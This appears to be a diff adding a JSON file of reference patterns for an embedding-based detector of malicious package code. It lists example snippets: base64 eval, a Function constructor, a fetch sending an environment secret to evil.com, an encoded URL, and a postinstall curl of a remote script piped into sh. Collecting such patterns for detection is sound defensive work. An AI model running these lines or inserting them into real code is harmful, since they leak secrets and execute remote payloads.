@@ -1,0 +1,30 @@
+{
+  "patterns": [
+    {
+      "name": "eval-malicious",
+      "code": "eval(atob('malicious'))",
+      "description": "Dynamic eval with base64 decoding"
+    },
+    {
+      "name": "function-constructor",
+      "code": "new Function('return malicious')()",
+      "description": "Function constructor with dynamic code"
+    },
+    {
+      "name": "env-exfiltration",
+      "code": "fetch('https://evil.com?data=' + process.env.SECRET)",
+      "description": "Environment variable exfiltration"
+    },
+    {
+      "name": "obfuscated-url",
+      "code": "atob('aHR0cHM6Ly9ldmlsLmNvbQ==')",
+      "description": "Base64 obfuscated URL"
+    },
+    {
+      "name": "postinstall-curl",
+      "code": "curl https://malicious.com/payload.sh | sh",
+      "description": "Suspicious postinstall with curl"
+    }
+  ],
+  "note": "Embeddings will be computed when the embedder is first initialized"
+}
